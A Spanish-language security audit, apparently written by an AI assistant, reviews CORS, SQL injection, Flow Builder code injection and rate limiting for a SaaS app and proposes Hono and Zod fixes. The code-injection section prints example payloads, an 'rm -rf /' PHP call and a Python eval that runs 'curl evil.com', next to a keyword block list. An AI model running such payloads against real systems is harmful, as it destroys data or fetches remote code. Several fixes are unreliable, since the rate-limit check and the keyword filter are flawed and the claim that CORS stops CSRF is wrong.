# SECURITY-AUDIT.md
## Auditoría de Seguridad: Apex IA SaaS

---

## 📋 RESUMEN EJECUTIVO

### Estado Actual
```
❌ CORS: NO está configurado (wildcard es peligroso)
❌ SQL Injection: Drizzle protege, pero FALTA validación de input
❌ Code Injection: NO hay validación en Flow Builder nodes
⚠️ OVERALL: 4/10 en seguridad (MVP, necesita hardening)
```

### Recomendación
**CRÍTICO:** Implementar seguridad ANTES de Fase 2, no después.

---

## 1️⃣ CORS: ¿Está Configurado?

### ACTUAL: ❌ NO MENCIONADO

Tu CLAUDE.md NO menciona CORS en ningún lado.

**Riesgo:** 
- Si no está configurado: **wildcard CORS es peligroso** 🔴
- Si está configurado: ¿cuál es el dominio?

### ¿QUÉ NECESITÁS?

**Opción A (Correcta - Recomendada):**
```typescript
// apps/api/src/index.ts (Hono)

import { cors } from 'hono/cors'

const app = new Hono()

app.use(cors({
  origin: [
    'https://app.apexia.com',           // tu frontend prod
    'https://localhost:3000',           // desarrollo
    'https://localhost:3001',           // desarrollo
  ],
  credentials: true,
  allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowHeaders: ['Content-Type', 'Authorization'],
  exposeHeaders: ['Content-Length'],
  maxAge: 600, // 10 minutos
}))
```

**Opción B (Inseguro - NUNCA USAR):**
```typescript
// ❌ NUNCA HAGAS ESTO
app.use(cors({
  origin: '*',  // 🔴 WILDCARD = CUALQUIERA PUEDE ACCEDER
  credentials: true
}))
```

**Por qué es importante:**
- CORS protege contra ataques CSRF (Cross-Site Request Forgery)
- Sin CORS correcto: sitios maliciosos pueden hacer requests a tu API como si fueran del usuario
- Credenciales (`Authorization` header) se envían solo a orígenes permitidos

---

## 2️⃣ SQL INJECTION: ¿Estás Protegido?

### ACTUAL: ✅ PARCIALMENTE PROTEGIDO

**Drizzle ORM te protege:**
```typescript
// ✅ SEGURO (Drizzle usa parameterized queries)
const conversations = await db
  .select()
  .from(conversations)
  .where(eq(conversations.id, userId))  // userId es parámetro

// Drizzle genera:
// SELECT * FROM conversations WHERE id = $1;
// Parámetros: [userId]
// → SQL injection IMPOSIBLE
```

### PERO: ⚠️ FALTA VALIDACIÓN DE INPUT

**Riesgo:** Aunque Drizzle protege de SQL injection, necesitás validar:

```typescript
// ❌ INSEGURO: Input sin validar
async function searchContacts(query: string) {
  // ¿Qué pasa si query tiene 100MB?
  // ¿Qué pasa si es un regex malicioso?
  // ¿Qué pasa si es código ejecutable?
  
  return db
    .select()
    .from(contacts)
    .where(like(contacts.name, `%${query}%`)) // query sin sanitizar
}

// ✅ CORRECTO: Input validado
import { z } from 'zod'

const searchSchema = z.object({
  query: z.string().min(1).max(100),  // 1-100 caracteres
  limit: z.number().min(1).max(100).default(10)
})

async function searchContacts(input: unknown) {
  const { query, limit } = searchSchema.parse(input)
  
  return db
    .select()
    .from(contacts)
    .where(like(contacts.name, `%${query}%`))
    .limit(limit)
}
```

### IMPLEMENTACIÓN: Zod (ya lo usás)

```typescript
// apps/api/src/validators/contact.validators.ts

import { z } from 'zod'

export const searchContactSchema = z.object({
  organizationId: z.string().uuid(),
  query: z.string()
    .min(1, "Query requerido")
    .max(100, "Query máximo 100 caracteres")
    .trim(),
  limit: z.number()
    .min(1)
    .max(100)
    .default(10),
  offset: z.number()
    .min(0)
    .default(0)
})

export const createContactSchema = z.object({
  name: z.string()
    .min(1, "Nombre requerido")
    .max(100, "Nombre máximo 100 caracteres"),
  email: z.string()
    .email("Email inválido")
    .optional(),
  phone: z.string()
    .regex(/^\+?[1-9]\d{1,14}$/, "Formato de teléfono inválido")
    .optional(),
  customFieldsJson: z.record(z.any())
    .optional()
    .refine(
      (obj) => obj === undefined || Object.keys(obj).length <= 50,
      "Máximo 50 campos custom"
    )
})
```

### CHECKLIST: SQL Injection

- [ ] Usás Drizzle ORM (✅ sí)
- [ ] Validás TODOS los inputs con Zod (❌ no aún)
- [ ] Longitud máxima en strings (❌ no aún)
- [ ] Tipos correctos (UUIDs como UUID, números como number, etc.) (❌ no aún)
- [ ] Rate limiting en queries costosas (❌ no aún)

---

## 3️⃣ CODE INJECTION: ¿Flow Builder es Seguro?

### ACTUAL: 🔴 CRÍTICO - NO HAY VALIDACIÓN

**Problema:** Flow Builder permite crear nodos con lógica custom.

```typescript
// INSEGURO: Flow node sin validar
{
  type: "AiResponseNode",
  config: {
    prompt: "<?php echo system('rm -rf /'); ?>",  // ❌ CODE INJECTION
    model: "claude"
  }
}

// O:
{
  type: "ConditionNode",
  condition: "eval('__import__(\"os\").system(\"curl evil.com\")')"  // ❌ CODE INJECTION
}
```

### SOLUCIÓN: Validar Estructura de Nodos

```typescript
// apps/api/src/validators/flow.validators.ts

import { z } from 'zod'

const triggerNodeSchema = z.object({
  id: z.string().uuid(),
  type: z.literal("TriggerNode"),
  data: z.object({
    triggerType: z.enum(["incoming_message", "keyword", "scheduled"])
  })
})

const conditionNodeSchema = z.object({
  id: z.string().uuid(),
  type: z.literal("ConditionNode"),
  data: z.object({
    condition: z.string()
      .min(1)
      .max(500)
      // ⚠️ NUNCA usar eval() o Function()
      // Solo permitir operadores simples: ==, !=, >, <, &&, ||
      .refine(
        (condition) => {
          // Validar que NO contiene código peligroso
          const forbidden = ['eval', 'Function', '__import__', 'require', 'exec']
          return !forbidden.some(word => condition.includes(word))
        },
        "Operación no permitida en condición"
      ),
    operator: z.enum(['==', '!=', '>', '<', '&&', '||']),
    value: z.string().max(100)
  })
})

const sendMessageNodeSchema = z.object({
  id: z.string().uuid(),
  type: z.literal("SendMessageNode"),
  data: z.object({
    content: z.string()
      .min(1)
      .max(5000),
    includeMedia: z.boolean().optional()
  })
})

// Unión de todos los tipos de nodos
const flowNodeSchema = z.union([
  triggerNodeSchema,
  conditionNodeSchema,
  sendMessageNodeSchema,
  // ... agregar más tipos
])

export const createFlowSchema = z.object({
  organizationId: z.string().uuid(),
  name: z.string()
    .min(1)
    .max(100),
  triggerType: z.enum(["incoming_message", "keyword", "scheduled"]),
  nodes: z.array(flowNodeSchema)
    .min(1, "Flow debe tener al menos 1 nodo")
    .max(100, "Flow máximo 100 nodos"),
  edges: z.array(z.object({
    source: z.string().uuid(),
    target: z.string().uuid()
  }))
    .max(100)
})
```

### NUNCA PERMITIR:
```typescript
// ❌ NUNCA
eval(userInput)
Function(userInput)
new Function(userInput)
require(userInput)
import(userInput)
```

### SÍ PERMITIR:
```typescript
// ✅ SEGURO: Operadores simples
"mensaje.length > 10"
"contact.email == 'xxx@example.com'"
"conversation.status != 'resolved'"
```

### CÓMO EJECUTAR CONDICIONES DE FORMA SEGURA:

```typescript
// apps/api/src/services/FlowExecutor.ts

class FlowExecutor {
  async evaluateCondition(
    condition: string,
    context: { message: Message; contact: Contact }
  ): Promise<boolean> {
    try {
      // ✅ SEGURO: Evaluar SOLO operadores permitidos
      const allowedOperators = ['==', '!=', '>', '<', '&&', '||']
      
      // Validar que solo contiene operadores permitidos
      const regex = /[a-zA-Z0-9_.]+\s*(==|!=|>|<|&&|\|\|)\s*[a-zA-Z0-9_."]+/g
      if (!regex.test(condition)) {
        throw new Error("Formato de condición inválido")
      }
      
      // Crear contexto seguro (solo campos específicos)
      const safeContext = {
        message: {
          content: context.message.content,
          length: context.message.content.length,
          senderType: context.message.senderType
        },
        contact: {
          name: context.contact.name,
          email: context.contact.email,
          phone: context.contact.phone
        }
      }
      
      // ❌ NUNCA usar eval
      // Usar un evaluador seguro
      return this.safeEval(condition, safeContext)
    } catch (error) {
      throw new Error(`Error evaluando condición: ${error.message}`)
    }
  }
  
  private safeEval(expression: string, context: any): boolean {
    // Opción 1: Usar librería segura como `expr-eval`
    const { Parser } = require('expr-eval')
    const parser = new Parser()
    return parser.evaluate(expression, context)
    
    // Opción 2: Implementar parser propio (más control)
    // return this.parseExpression(expression, context)
  }
}
```

### CHECKLIST: Code Injection

- [ ] Validás estructura de Flow nodes con Zod (❌ no aún)
- [ ] Validás que NO contienen palabras clave peligrosas (❌ no aún)
- [ ] NO usás `eval()` o `Function()` (✅ no lo hacés)
- [ ] Usás evaluador seguro para condiciones (❌ no aún)
- [ ] Limitás longitud de inputs (❌ no aún)
- [ ] Tests para inyección de código (❌ no aún)

---

## 4️⃣ OTROS RIESGOS

### XSS (Cross-Site Scripting)
**Estado:** ✅ Protegido
- Next.js sanitiza por defecto
- React escapa HTML automáticamente
- Solo peligro si usás `dangerouslySetInnerHTML` (no lo hacés)

**Acción:** Nunca usar `dangerouslySetInnerHTML`

---

### CSRF (Cross-Site Request Forgery)
**Estado:** ⚠️ Parcialmente protegido
- Supabase Auth usa CSRF tokens
- Necesitás CORS correcto (ver punto 1)

**Acción:** Implementar CORS estricto

---

### Rate Limiting
**Estado:** ❌ NO MENCIONADO

```typescript
// apps/api/src/middleware/rateLimitMiddleware.ts

import { Redis } from '@upstash/redis'
import { Ratelimit } from '@upstash/ratelimit'

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(100, '1 h'),  // 100 requests/hora
})

export const rateLimitMiddleware = async (c: Context, next: Next) => {
  const ip = c.req.header('x-forwarded-for') || '0.0.0.0'
  
  const { limit, remaining } = await ratelimit.limit(`ip:${ip}`)
  
  if (!limit) {
    return c.json({ error: 'Rate limit exceeded' }, 429)
  }
  
  c.header('X-RateLimit-Limit', limit.toString())
  c.header('X-RateLimit-Remaining', remaining.toString())
  
  return next()
}
```

**Acción:** Implementar rate limiting en endpoints críticos

---

### Authentication & Authorization
**Estado:** ⚠️ Partial
- Supabase Auth ✅
- JWT verification ✅
- Role-based access control ❌ (no mencionado)

```typescript
// apps/api/src/middleware/authMiddleware.ts (MEJORAR)

export const adminOnly = async (c: Context, next: Next) => {
  const userId = c.get('userId')
  const role = c.get('userRole')  // Necesitás agregar esto
  
  if (role !== 'admin') {
    return c.json({ error: 'Unauthorized' }, 403)
  }
  
  return next()
}
```

---

## 5️⃣ PLAN DE SEGURIDAD POR FASE

### ✅ ANTES DE FASE 1 (AHORA)
- [ ] Implementar CORS estricto
- [ ] Implementar input validation (Zod)
- [ ] Setup rate limiting
- [ ] Agregar logging de seguridad

### ✅ FASE 1-2
- [ ] Validar Flow nodes (prohibir code injection)
- [ ] HTTPS everywhere (certificado SSL)
- [ ] Secrets en .env, no en código

### ✅ FASE 3+
- [ ] Audit logging (quién hizo qué)
- [ ] Encriptación de datos en tránsito + reposo
- [ ] Key rotation policies
- [ ] Penetration testing

### ✅ ANTES DE PRODUCCIÓN
- [ ] Security headers (CSP, X-Frame-Options, etc.)
- [ ] WAF (Web Application Firewall) - Cloudflare
- [ ] OWASP Top 10 checklist
- [ ] Vulnerability scanning
- [ ] Sentry para error tracking

---

## 🔐 DOCUMENTO DE CONFIGURACIÓN SEGURA

Voy a crear `SECURITY-CONFIG.md` con:

1. CORS configurado
2. Zod validators para todos los inputs
3. Rate limiting
4. Security headers
5. Flow node validation
6. Tests de seguridad

---

## 📊 SCORING

```
CORS:              2/10 (no configurado)
SQL Injection:     7/10 (Drizzle protege, falta validar inputs)
Code Injection:    3/10 (Flow Builder sin validación)
XSS:               8/10 (React protege)
CSRF:              5/10 (depende de CORS)
Rate Limiting:     0/10 (no existe)
Auth:              7/10 (Supabase Auth ok, roles incompletos)
─────────────────────
OVERALL:           4/10 (MVP, necesita hardening urgente)
```

---

## ✅ SIGUIENTE ACCIÓN

Quieres que cree `SECURITY-CONFIG.md` con:

1. **Configuración de CORS** (lista de dominios permitidos)
2. **Zod Validators** (para TODOS los inputs)
3. **Rate Limiting** (by IP, by user, by endpoint)
4. **Security Headers** (CSP, X-Frame-Options, etc.)
5. **Flow Node Validation** (prohibir inyecciones)
6. **Tests de Seguridad** (unit + integration)

¿SÍ? Hago ahora o espero a que termines el CHECKLIST-FINAL?
